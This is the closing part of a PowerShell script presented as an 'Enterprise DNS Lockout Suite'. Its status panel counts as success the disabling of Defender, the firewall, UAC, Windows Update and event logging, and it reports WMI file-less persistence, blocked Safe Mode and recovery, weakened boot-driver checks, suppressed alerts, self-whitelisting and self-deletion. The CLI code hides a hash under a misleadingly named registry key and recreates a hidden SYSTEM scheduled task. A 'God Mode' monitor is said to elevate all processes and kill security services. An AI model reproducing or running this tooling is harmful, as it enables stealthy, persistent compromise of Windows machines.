        Write-Host "  Defender Services       : $RunningSvcs RUNNING ($($DefenderSvcs.Count) total)" -ForegroundColor Red
    }

    # Real-time monitoring
    try {
        $MpPref = Get-MpPreference -ErrorAction SilentlyContinue
        if ($MpPref -and $MpPref.DisableRealtimeMonitoring) {
            Write-Host "  Real-Time Monitoring    : DISABLED" -ForegroundColor Green
        } else {
            Write-Host "  Real-Time Monitoring    : ENABLED (or indeterminate)" -ForegroundColor Red
        }
    } catch {
        Write-Host "  Real-Time Monitoring    : UNKNOWN (Get-MpPreference failed)" -ForegroundColor DarkGray
    }

    # Firewall
    $FirewallProfiles = Get-NetFirewallProfile -ErrorAction SilentlyContinue
    $FwEnabled = 0
    foreach ($fp in $FirewallProfiles) {
        if ($fp.Enabled) { $FwEnabled++ }
    }
    if ($FwEnabled -eq 0) {
        Write-Host "  Windows Firewall        : ALL PROFILES OFF" -ForegroundColor Green
    } else {
        Write-Host "  Windows Firewall        : $FwEnabled/$(($FirewallProfiles | Measure-Object).Count) PROFILES ON" -ForegroundColor Red
    }

    # UAC / LUA
    try {
        $lua = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -ErrorAction SilentlyContinue
        if ($lua -and $lua.EnableLUA -eq 0) {
            Write-Host "  UAC (LUA)               : DISABLED" -ForegroundColor Green
        } else {
            Write-Host "  UAC (LUA)               : ENABLED" -ForegroundColor Red
        }
    } catch {
        Write-Host "  UAC (LUA)               : UNKNOWN" -ForegroundColor DarkGray
    }

    # Windows Update
    try {
        $wu = Get-Service -Name "wuauserv" -ErrorAction SilentlyContinue
        if ($wu -and $wu.Status -eq 'Running') {
            Write-Host "  Windows Update Service  : RUNNING" -ForegroundColor Red
        } else {
            Write-Host "  Windows Update Service  : STOPPED" -ForegroundColor Green
        }
    } catch {
        Write-Host "  Windows Update Service  : UNKNOWN" -ForegroundColor DarkGray
    }

    # WMI Persistence
    try {
        $WmiFilter = Get-WmiObject -Class __EventFilter -Namespace "root\subscription" -Filter "Name='Win32ProviderHealthCheck'" -ErrorAction SilentlyContinue
        if ($WmiFilter) {
            Write-Host "  WMI Persistence         : ACTIVE (file-less fallback)" -ForegroundColor Red
        } else {
            Write-Host "  WMI Persistence         : NOT ACTIVE" -ForegroundColor Green
        }
    } catch {
        Write-Host "  WMI Persistence         : UNKNOWN" -ForegroundColor DarkGray
    }

    # Safe Mode / Recovery
    try {
        $BcdOutput = bcdedit /enum {current} 2>$null | Out-String
        $SafeModeBlocked = ($BcdOutput -match "safeboot\s+minimal")
        $ReBlocked = ($BcdOutput -match "recoveryenabled\s+No")
        if ($SafeModeBlocked -and $ReBlocked) {
            Write-Host "  Safe Mode / Recovery    : BLOCKED (BCD hardened)" -ForegroundColor Red
        } elseif ($SafeModeBlocked -or $ReBlocked) {
            Write-Host "  Safe Mode / Recovery    : PARTIALLY BLOCKED" -ForegroundColor Yellow
        } else {
            Write-Host "  Safe Mode / Recovery    : AVAILABLE" -ForegroundColor Green
        }
    } catch {
        Write-Host "  Safe Mode / Recovery    : UNKNOWN" -ForegroundColor DarkGray
    }

    # ELAM
    try {
        $Elam = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\EarlyLaunch" -Name "DriverLoadPolicy" -ErrorAction SilentlyContinue
        if ($Elam -and $Elam.DriverLoadPolicy -eq 3) {
            Write-Host "  ELAM Boot Drivers       : UNKNOWN ALLOWED" -ForegroundColor Red
        } else {
            Write-Host "  ELAM Boot Drivers       : ENFORCED" -ForegroundColor Green
        }
    } catch {
        Write-Host "  ELAM Boot Drivers       : UNKNOWN" -ForegroundColor DarkGray
    }

    # Security Center Alerts
    try {
        $ScAlert = Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" -Name "DisableNotifications" -ErrorAction SilentlyContinue
        if ($ScAlert -and $ScAlert.DisableNotifications -eq 1) {
            Write-Host "  Security Center Alerts  : SUPPRESSED" -ForegroundColor Red
        } else {
            Write-Host "  Security Center Alerts  : ACTIVE" -ForegroundColor Green
        }
    } catch {
        Write-Host "  Security Center Alerts  : UNKNOWN" -ForegroundColor DarkGray
    }

    # Event Logging
    try {
        $EvtSvc = Get-Service -Name "EventLog" -ErrorAction SilentlyContinue
        if ($EvtSvc -and $EvtSvc.Status -eq 'Running') {
            Write-Host "  Event Logging           : RUNNING" -ForegroundColor Green
        } else {
            Write-Host "  Event Logging           : STOPPED / CLEARED" -ForegroundColor Red
        }
    } catch {
        Write-Host "  Event Logging           : UNKNOWN" -ForegroundColor DarkGray
    }

    # Defender Exclusions
    try {
        $Exclusions = Get-MpPreference -ErrorAction SilentlyContinue | Select-Object -ExpandProperty ExclusionPath -ErrorAction SilentlyContinue
        if ($Exclusions -and ($Exclusions -contains $GodModeInstallDir -or $Exclusions -contains $PSCommandPath)) {
            Write-Host "  Defender Exclusions     : SELF-WHITELISTED" -ForegroundColor Red
        } else {
            Write-Host "  Defender Exclusions     : NOT WHITELISTED" -ForegroundColor Green
        }
    } catch {
        Write-Host "  Defender Exclusions     : UNKNOWN" -ForegroundColor DarkGray
    }

    # File-less / Self-Destruct
    try {
        if (Test-Path $PSCommandPath) {
            Write-Host "  Original Payload        : ON DISK" -ForegroundColor Green
        } else {
            Write-Host "  Original Payload        : SELF-DESTRUCTED (file-less)" -ForegroundColor Red
        }
    } catch {
        Write-Host "  Original Payload        : UNKNOWN" -ForegroundColor DarkGray
    }

    Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray
}

# ============================================================================
# 8. CLI EXECUTION HANDLER
# ============================================================================

# Handle CLI Flags
if ($SilentLock) {
    # Self-integrity check: verify the installed script has not been tampered with
    $IntegrityRegPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\WpnPlatform\Settings"
    $IntegrityFile = Join-Path $InstallDir "integrity.sha256"
    $HashCheckPassed = $true

    # Primary check: registry stored hash (misleading key name)
    $ExpectedHash = $null
    try { $ExpectedHash = (Get-ItemProperty -Path $IntegrityRegPath -Name "PushConfigBackoffInterval" -ErrorAction Stop).PushConfigBackoffInterval } catch {}

    if ($ExpectedHash) {
        $ActualHash = (Get-FileHash -Path $InstallScript -Algorithm SHA256).Hash
        if ($ExpectedHash.Trim() -ne $ActualHash.Trim()) {
            Write-Log -Message "INTEGRITY FAILURE: Registry hash mismatch! Expected: $ExpectedHash  Actual: $ActualHash" -Type "SECURITY" -Color Red
            $HashCheckPassed = $false
        }
    } elseif (Test-Path $IntegrityFile) {
        # Fallback to file hash if registry key is missing
        $ExpectedHash = Get-Content -Path $IntegrityFile -Raw
        $ActualHash = (Get-FileHash -Path $InstallScript -Algorithm SHA256).Hash
        if ($ExpectedHash.Trim() -ne $ActualHash.Trim()) {
            Write-Log -Message "INTEGRITY FAILURE: File hash mismatch! Expected: $ExpectedHash  Actual: $ActualHash" -Type "SECURITY" -Color Red
            $HashCheckPassed = $false
        }
    }

    if (-not $HashCheckPassed) {
        Enable-DNSLock
        Exit
    }

    # Guardian: ensure main task still exists and recreate it if deleted
    $MainTask = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
    if (-not $MainTask) {
        Write-Log -Message "Main task '$TaskName' is missing! Recreating from guardian..." -Type "SECURITY" -Color Red
        $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$InstallScript`" -SilentLock"
        $Trigger1 = New-ScheduledTaskTrigger -AtStartup
        $Trigger2 = New-ScheduledTaskTrigger -AtLogOn
        $CimClass = Get-CimClass -ClassName MSFT_TaskEventTrigger -Namespace "Root/Microsoft/Windows/TaskScheduler"
        $Trigger3 = New-CimInstance -CimClass $CimClass -ClientOnly
        $Trigger3.Subscription = "<QueryList><Query Id='0' Path='Microsoft-Windows-NetworkProfile/Operational'><Select Path='Microsoft-Windows-NetworkProfile/Operational'>*[System[EventID=10000]]</Select></Query></QueryList>"
        $Trigger3.Enabled = $True
        $PrincipalSettings = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
        Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger @($Trigger1, $Trigger2, $Trigger3) -Principal $PrincipalSettings -Force | Out-Null
    }

    Enable-DNSLock
    Exit
}
if ($Lock)       { Enable-DNSLock; Exit }
if ($Unlock)     { Disable-DNSLock; Exit }
if ($Install)    { Install-Persistence; Exit }
if ($Uninstall) {
    $CurrentUser = [Security.Principal.WindowsIdentity]::GetCurrent().Name
    $CurrentUserSid = [Security.Principal.WindowsIdentity]::GetCurrent().User
    if ($CurrentUserSid.Value -ne "S-1-5-18") {
        Write-Host "[SECURITY] CLI Uninstall denied: Must run as SYSTEM. Current user: $CurrentUser" -ForegroundColor Red
        Write-Host "Run from a SYSTEM shell (e.g., psexec -s powershell.exe -File `"$InstallScript`" -Uninstall)" -ForegroundColor Yellow
        Exit
    }
    Uninstall-Persistence
    Exit
}

# God Mode CLI Handlers
if ($ToggleOn) {
    if (-not (Test-BuiltInAdmin)) {
        Write-Host "`n[ACCESS DENIED] Only the Built-in Administrator can use God Mode.`n" -ForegroundColor Red
        Exit 1
    }
    Enable-GodMode; Exit
}
if ($ToggleOff) {
    if (-not (Test-BuiltInAdmin)) {
        Write-Host "`n[ACCESS DENIED] Only the Built-in Administrator can use God Mode.`n" -ForegroundColor Red
        Exit 1
    }
    Disable-GodMode; Exit
}
if ($GodModeStatus) { Show-GodModeStatus; Exit }
if ($Launch) {
    if (-not (Test-BuiltInAdmin)) {
        Write-Host "`n[ACCESS DENIED] Only the Built-in Administrator can use God Mode.`n" -ForegroundColor Red
        Exit 1
    }
    Start-Monitoring; Exit
}
if ($InstallGodMode) {
    if (-not (Test-BuiltInAdmin)) {
        Write-Host "`n[ACCESS DENIED] Only the Built-in Administrator can install God Mode.`n" -ForegroundColor Red
        Exit 1
    }
    Install-GodModePersistence; Exit
}
if ($UninstallGodMode) {
    if (-not (Test-BuiltInAdmin)) {
        Write-Host "`n[ACCESS DENIED] Only the Built-in Administrator can uninstall God Mode.`n" -ForegroundColor Red
        Exit 1
    }
    Uninstall-GodModePersistence; Exit
}

# If no flags are passed, load the Interactive Menu
do {
    Clear-Host
    Write-Host "=====================================================" -ForegroundColor Cyan
    Write-Host "   ENTERPRISE DNS LOCKOUT SUITE (INSTALLER EDITION)  " -ForegroundColor Cyan
    Write-Host "=====================================================" -ForegroundColor Cyan

    $CurrentStatus = Get-DNSLockStatus

    Write-Host "`n-----------------------------------------------------" -ForegroundColor DarkGray
    Write-Host "  DNS PROTECTION    " -ForegroundColor Cyan
    Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray
    Write-Host "[1] DEPLOY LOCK (Secure All Active Adapters)" -ForegroundColor Cyan
    Write-Host "[2] REMOVE LOCK (Ångra / Restore Access)" -ForegroundColor Yellow
    if (-not (Test-Path $InstallDir)) {
        Write-Host "[3] INSTALL SERVICE (Auto-Heal & Create 'dnslock' command)" -ForegroundColor Green
    }
    Write-Host "[4] UNINSTALL SERVICE (Remove background tasks & Unlock)" -ForegroundColor Red
    Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray
    Write-Host "  SYSTEM            " -ForegroundColor White
    Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray
    Write-Host "[5] REFRESH SYSTEM STATUS" -ForegroundColor Gray
    Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray
    Write-Host "  GOD MODE (DANGEROUS)  " -ForegroundColor Magenta
    Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray
    if (-not (Test-Path $GodModeInstallDir)) {
        Write-Host "[6] INSTALL GOD MODE SERVICE (Auto-Enable & Create 'godmode' CLI)" -ForegroundColor Green
    } else {
        Write-Host "[6] UNINSTALL GOD MODE SERVICE (Remove background tasks)" -ForegroundColor Red
    }
    Write-Host "[7] ENABLE GOD MODE (Built-in Admin Only)" -ForegroundColor Magenta
    Write-Host "[8] DISABLE GOD MODE (Built-in Admin Only)" -ForegroundColor DarkMagenta
    Write-Host "[9] CHECK GOD MODE STATUS" -ForegroundColor Gray
    Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray
    Write-Host "[10] LAUNCH GOD MODE MONITOR (Built-in Admin Only)" -ForegroundColor Magenta
    Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray
    Write-Host "  SESSION           " -ForegroundColor White
    Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray
    Write-Host "[11] EXIT TERMINAL" -ForegroundColor Gray
    Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray

    $Choice = Read-Host "Select an administrative action (1-11)"
    $IntegrityStatus = Test-IntegrityStatus

    switch ($Choice) {
        "1" {
            if ($IntegrityStatus -eq $false) {
                Write-Host "`n[BLOCKED] Option [1] is disabled because the script has been tampered with." -ForegroundColor Red -BackgroundColor Black
                Write-Host "Use option [4] to uninstall, then reinstall from a clean source." -ForegroundColor Yellow
            } else {
                Enable-DNSLock
            }
            Write-Host "`n[ PRESS ANY KEY TO RETURN TO MENU ]" -ForegroundColor DarkGray; $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        }
        "2" {
            if ($IntegrityStatus -eq $false) {
                Write-Host "`n[BLOCKED] Option [2] is disabled because the script has been tampered with." -ForegroundColor Red -BackgroundColor Black
                Write-Host "Use option [4] to uninstall, then reinstall from a clean source." -ForegroundColor Yellow
            } else {
                Disable-DNSLock
            }
            Write-Host "`n[ PRESS ANY KEY TO RETURN TO MENU ]" -ForegroundColor DarkGray; $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        }
        "3" {
            if ($IntegrityStatus -eq $false) {
                Write-Host "`n[BLOCKED] Option [3] is disabled because the script has been tampered with." -ForegroundColor Red -BackgroundColor Black
                Write-Host "Use option [4] to uninstall, then reinstall from a clean source." -ForegroundColor Yellow
            } elseif (Test-Path $InstallDir) {
                Write-Warning "DNS-Guard is already installed. Option [3] is unavailable."
            } else {
                Install-Persistence
            }
            Write-Host "`n[ PRESS ANY KEY TO RETURN TO MENU ]" -ForegroundColor DarkGray; $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        }
        "4" { Uninstall-Persistence; Write-Host "`n[ PRESS ANY KEY TO RETURN TO MENU ]" -ForegroundColor DarkGray; $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown") }
        "5" { Start-Sleep -Milliseconds 200 }
        "6" {
            if (-not (Test-BuiltInAdmin)) {
                Write-Host "`n[ACCESS DENIED] Only the Built-in Administrator can use God Mode.`n" -ForegroundColor Red
            } else {
                if (-not (Test-Path $GodModeInstallDir)) {
                    Install-GodModePersistence
                    Write-Host "God Mode service installed." -ForegroundColor Green
                } else {
                    Uninstall-GodModePersistence
                    Write-Host "God Mode service uninstalled." -ForegroundColor Yellow
                }
            }
            Write-Host "`n[ PRESS ANY KEY TO RETURN TO MENU ]" -ForegroundColor DarkGray; $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        }
        "7" {
            if (-not (Test-BuiltInAdmin)) {
                Write-Host "`n[ACCESS DENIED] Only the Built-in Administrator can use God Mode.`n" -ForegroundColor Red
            } else {
                Enable-GodMode
                Write-Host "God Mode enabled." -ForegroundColor Green
            }
            Write-Host "`n[ PRESS ANY KEY TO RETURN TO MENU ]" -ForegroundColor DarkGray; $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        }
        "8" {
            if (-not (Test-BuiltInAdmin)) {
                Write-Host "`n[ACCESS DENIED] Only the Built-in Administrator can use God Mode.`n" -ForegroundColor Red
            } else {
                Disable-GodMode
                Write-Host "God Mode disabled." -ForegroundColor Yellow
            }
            Write-Host "`n[ PRESS ANY KEY TO RETURN TO MENU ]" -ForegroundColor DarkGray; $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        }
        "9" { Show-GodModeStatus; Start-Sleep -Seconds 2 }
        "10" {
            if (-not (Test-BuiltInAdmin)) {
                Write-Host "`n[ACCESS DENIED] Only the Built-in Administrator can launch the God Mode Monitor.`n" -ForegroundColor Red
            } else {
                Write-Host "`n[WARNING] Launching God Mode Monitor will start a persistent loop that elevates" -ForegroundColor Yellow
                Write-Host "          all new processes and kills security services. This is IRREVERSIBLE" -ForegroundColor Yellow
                Write-Host "          without closing the PowerShell process or rebooting." -ForegroundColor Yellow
                $confirm = Read-Host "Type 'YES' to launch the monitor"
                if ($confirm -eq 'YES') {
                    Start-Monitoring
                } else {
                    Write-Host "Launch cancelled." -ForegroundColor Green
                }
            }
            Write-Host "`n[ PRESS ANY KEY TO RETURN TO MENU ]" -ForegroundColor DarkGray; $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        }
        "11" { Write-Host "Exiting..." -ForegroundColor DarkGray; Start-Sleep -Milliseconds 500; break }
        default { Write-Warning "Invalid Selection."; Start-Sleep -Seconds 1 }
    }
} while ($Choice -ne "11")
